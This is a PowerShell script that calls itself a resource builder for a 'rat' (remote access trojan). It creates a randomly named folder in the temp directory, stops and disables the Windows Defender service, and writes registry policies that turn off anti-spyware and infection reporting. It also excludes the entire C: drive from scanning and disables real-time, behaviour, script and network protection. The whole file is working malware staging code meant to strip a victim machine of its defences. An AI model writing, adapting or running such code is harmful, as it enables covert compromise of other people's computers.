#builds resources for rat
#created by : CHEPHYTY

#random string for directories

function random_text {
    param ($text)
    return -join ((65..90) + (97..122) | Get-Random -Count 5 | % { [char]$_ })
    
}
# By Pass the 
cd $env:temp 
$directory_name = random_text
mkdir $directory_name


# Attempt to disable Windows Defender
try {
    # Stop the WinDefend service
    Get-Service WinDefend | Stop-Service -Force
    # Disable the WinDefend service
    Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\WinDefend" -Name "Start" -Value 4 -Type DWORD -Force
}
catch {
    Write-Warning "Failed to disable WinDefend service..."
}

try {
    # Create registry keys and set properties to disable Windows Defender
    New-Item -Path 'HKLM:\SOFTWARE\Policies\Microsoft' -Name "Windows Defender" -Force -ErrorAction SilentlyContinue | Out-Null
    New-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender" -Name "DisableAntiSpyware" -Value 1 -PropertyType DWORD -Force -ErrorAction SilentlyContinue | Out-Null
    New-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender" -Name "DisableRoutineTakingAction" -Value 1 -PropertyType DWORD -Force -ErrorAction SilentlyContinue | Out-Null
    New-Item -Path 'HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender' -Name "Spynet" -Force -ErrorAction SilentlyContinue | Out-Null
    New-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender\Spynet" -Name "SpyNetReporting" -Value 1 -PropertyType DWORD -Force -ErrorAction SilentlyContinue | Out-Null
    New-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender\Spynet" -Name "SubmitSamplesConsent" -Value 1 -PropertyType DWORD -Force -ErrorAction SilentlyContinue | Out-Null
    New-Item -Path 'HKLM:\SOFTWARE\Policies\Microsoft' -Name "MRT" -Force -ErrorAction SilentlyContinue | Out-Null
    New-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\MRT" -Name "DontReportInfectionInformation" -Value 1 -PropertyType DWORD -Force -ErrorAction SilentlyContinue | Out-Null

    if ((Get-WmiObject -Class Win32_OperatingSystem).Version -ne "6.1.7601") {

        # Removed Invalid Parameters: Removed -Force and -ea 0 from Set-MpPreference cmdlets. 
        Add-MpPreference -ExclusionPath "C:\" | Out-Null
        Set-MpPreference -DisableArchiveScanning $true | Out-Null
        Set-MpPreference -DisableBehaviorMonitoring $true | Out-Null
        Set-MpPreference -DisableBlockAtFirstSeen $true | Out-Null
        Set-MpPreference -DisableCatchupFullScan $true | Out-Null
        Set-MpPreference -DisableCatchupQuickScan $true | Out-Null
        Set-MpPreference -DisableIntrusionPreventionSystem $true | Out-Null
        Set-MpPreference -DisableIOAVProtection $true | Out-Null
        Set-MpPreference -DisableRealtimeMonitoring $true | Out-Null
        Set-MpPreference -DisableRemovableDriveScanning $true | Out-Null
        Set-MpPreference -DisableRestorePoint $true | Out-Null
        Set-MpPreference -DisableScanningMappedNetworkDrivesForFullScan $true | Out-Null
        Set-MpPreference -DisableScanningNetworkFiles $true | Out-Null
        Set-MpPreference -DisableScriptScanning $true | Out-Null
        Set-MpPreference -EnableControlledFolderAccess Disabled | Out-Null
        Set-MpPreference -EnableNetworkProtection AuditMode | Out-Null
        Set-MpPreference -MAPSReporting Disabled | Out-Null
        Set-MpPreference -SubmitSamplesConsent NeverSend | Out-Null
        Set-MpPreference -PUAProtection Disabled | Out-Null   
    }
    # {
    #     Add-MpPreference -ExclusionPath "C:\" -Force -ea 0 | Out-Null
    #     Set-MpPreference -DisableArchiveScanning $true -ea 0 | Out-Null
    #     Set-MpPreference -DisableBehaviorMonitoring $true -Force -ea 0 | Out-Null
    #     Set-MpPreference -DisableBlockAtFirstSeen $true -Force -ea 0 | Out-Null
    #     Set-MpPreference -DisableCatchupFullScan $true -Force -ea 0 | Out-Null
    #     Set-MpPreference -DisableCatchupQuickScan $true -Force -ea 0 | Out-Null
    #     Set-MpPreference -DisableIntrusionPreventionSystem $true -Force -ea 0 | Out-Null
    #     Set-MpPreference -DisableIOAVProtection $true -Force -ea 0 | Out-Null
    #     Set-MpPreference -DisableRealtimeMonitoring $true -Force -ea 0 | Out-Null
    #     Set-MpPreference -DisableRemovableDriveScanning $true -Force -ea 0 | Out-Null
    #     Set-MpPreference -DisableRestorePoint $true -Force -ea 0 | Out-Null
    #     Set-MpPreference -DisableScanningMappedNetworkDrivesForFullScan $true -Force -ea 0 | Out-Null
    #     Set-MpPreference -DisableScanningNetworkFiles $true -Force -ea 0 | Out-Null
    #     Set-MpPreference -DisableScriptScanning $true -Force -ea 0 | Out-Null
    #     Set-MpPreference -EnableContolledFolderAscess Disable  -Force -ea 0 | Out-Null
    #     Set-MpPreference -EnableNetworkProtection AuditMode  -Force -ea 0 | Out-Null
    #     Set-MpPreference -MAPSReproting Disable  -Force -ea 0 | Out-Null
    #     Set-MpPreference -SubmitSamplesConsent NeverSend  -Force -ea 0 | Out-Null
    #     Set-MpPreference -PUAProtection Disable  -Force -ea 0 | Out-Null   
    # }
}
catch {
    <#Do this if a terminating exception happens#>
    Write-Warning "Failed to set registry keys to disable Windows Defender..."

}
